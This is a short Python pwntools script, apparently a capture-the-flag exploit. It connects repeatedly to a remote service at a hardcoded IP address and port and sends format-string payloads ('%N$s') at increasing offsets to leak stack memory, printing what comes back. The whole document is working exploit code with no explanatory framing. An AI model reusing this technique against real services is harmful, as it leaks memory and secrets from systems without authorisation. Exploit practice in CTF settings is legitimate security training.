from pwn import *
import sys

i = 0
while True:
        i += 1
        try:
                r = remote('89.38.210.128', 31339, level='error')
                r.recvuntil("? > ")
                r.sendline("%" + str(i) + "$s")
                r.recvline()
                r.sendline("42")
                r.recvline()
                r.sendline("77")
                r.recvline()
                r.sendline("111")
                r.recvline()
                sys.stdout.write(r.recvline())
                r.close()
        except EOFError, exception:
                pass
